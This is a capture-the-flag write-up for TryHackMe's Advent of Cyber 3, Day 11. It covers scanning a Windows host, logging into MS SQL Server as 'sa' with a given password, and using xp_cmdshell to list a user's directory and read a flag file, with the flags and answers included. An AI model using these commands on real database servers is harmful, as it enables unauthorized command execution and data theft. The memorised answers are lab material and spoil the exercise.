# Advent of Cyber - Day 11

Link: [Advent Of Cyber 3 on TryHackMe](https://tryhackme.com/room/adventofcyber3)

### Question 1

You decided that the first step would be to check the running services on $ip. You resort to yesterday’s tool, Nmap.

Knowing that $ip is a MS Windows system, you expect it to not respond to ping probes by default; therefore, you need to add -Pn to your nmap command to perform the scan. This instructs Nmap to skip pinging the target to see if the host is reachable. Without this option, Nmap will assume the target host is offline and not proceed with scanning.

There is an open port related to MS SQL Server accessible over the network. What is the port number?

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/1.png?raw=true)

Answer: `1433`

### Question 2

Let’s try to run, `sqsh -S $ip -U sa -P t7uLKzddQzVjVFJp`

If the connection is successful, you will get a prompt. What is the prompt that you have received?

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/2.png?raw=true)

Answer: `>1`

### Question 3

We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/3.png?raw=true)

Answer: `Rudolph`

### Question 4

Check the table schedule. What is the destination of the trip scheduled on December 7?

Command:
```
1> SELECT * FROM reindeer.dbo.schedule;
2> go
```

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/4.png?raw=true)

Answer: `Prague`

### Question 5

Check the table presents. What is the quantity available for the present “Power Bank”?

Command:
```
1> SELECT * FROM reindeer.dbo.presents;
2> go
```

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/5.png?raw=true)

Answer: `25000`

### Question 6

There is a flag hidden in the grinch user's home directory. What are its contents?

Commands:

```
1> xp_cmdshell 'dir C:\Users\grinch\Documents';
2> go
```

```
1> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
2> go
```

| Dirlist | Flag |
|:-:|---|
| ![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/6.1.png?raw=true) | ![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day11/6.2.png?raw=true) |

Answer: `THM{YjtKeUy2qT3v5dDH}`

### Question 7

Congratulations, the flag you have recovered contains the password of McDatabaseAdmin! In this task, we learned how to use sqsh to interact with a MS SQL Server. We learned that if xp_cmdshell is enabled, we can execute system commands and read the output using sqsh.

Answer: `No answer needed`